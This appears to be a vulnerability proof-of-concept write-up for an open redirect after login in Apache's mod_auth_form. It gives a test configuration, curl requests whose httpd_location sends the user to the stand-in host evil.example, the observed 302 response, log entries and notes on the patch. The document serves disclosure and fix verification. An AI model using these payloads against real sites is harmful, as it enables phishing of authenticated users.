# PoC 081 - Open Redirect After Login-Handler Authentication

`authenticate_form_login_handler()` redirects to `sent_loc` after a successful
login without checking that the target is a local relative URL.

## Setup

Same module set as PoC 080. `/etc/apache2/httpd.conf` adds an explicit login
endpoint that uses `form-login-handler`:

```apache
ServerName localhost
Listen 8080
LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authn_file_module modules/mod_authn_file.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_user_module modules/mod_authz_user.so
LoadModule auth_form_module modules/mod_auth_form.so
LoadModule session_module modules/mod_session.so
LoadModule session_cookie_module modules/mod_session_cookie.so
LoadModule request_module modules/mod_request.so

DocumentRoot "/srv/www"

<Location "/login">
    SetHandler form-login-handler
    AuthFormProvider file
    AuthUserFile "/etc/apache2/users.htpasswd"
    AuthType form
    AuthName realm
    Session On
    SessionCookieName session path=/
    SessionCryptoPassphrase "secretsecretsecret"
</Location>

<Directory "/srv/www">
    AuthType form
    AuthName realm
    AuthFormProvider file
    AuthUserFile "/etc/apache2/users.htpasswd"
    Session On
    SessionCookieName session path=/
    SessionCryptoPassphrase "secretsecretsecret"
    Require valid-user
</Directory>
```

```bash
htpasswd -bc /etc/apache2/users.htpasswd alice s3cret
```

## Trigger

The attacker convinces a victim with valid credentials to submit a login POST
whose `httpd_location` is attacker-controlled:

```bash
curl -i -X POST http://127.0.0.1:8080/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'httpd_username=alice&httpd_password=s3cret&httpd_location=https://evil.example/welcome'
```

Equivalent scheme-relative form:

```bash
curl -i -X POST http://127.0.0.1:8080/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'httpd_username=alice&httpd_password=s3cret&httpd_location=//evil.example/welcome'
```

## Observed effect

```text
HTTP/1.1 302 Found
Set-Cookie: session=...; Path=/
Location: https://evil.example/welcome
Content-Length: 0
```

Authentication succeeded, a session cookie was issued for the legitimate
origin, and the response immediately redirects the user-agent off-site to the
attacker's destination. The attacker phishes against the legitimate login URL.

## Log marker

`access_log`:

```text
127.0.0.1 - alice "POST /login HTTP/1.1" 302 -
```

`error_log` (with `LogLevel auth_form:debug`):

```text
[auth_form:debug] form login successful for user 'alice'
[auth_form:debug] redirecting to sent_loc=https://evil.example/welcome
```

## Notes

- The patch rejects `sent_loc` if `ap_is_url(sent_loc)` is true or if it begins
  with `//`. Both forms in the trigger above are rejected by the fix.
- The vulnerability's preconditions are looser than they appear: any login form
  on the deployment may be the entry point, and the malicious form value can
  be provided by a hidden input on a page the victim visits before logging in.
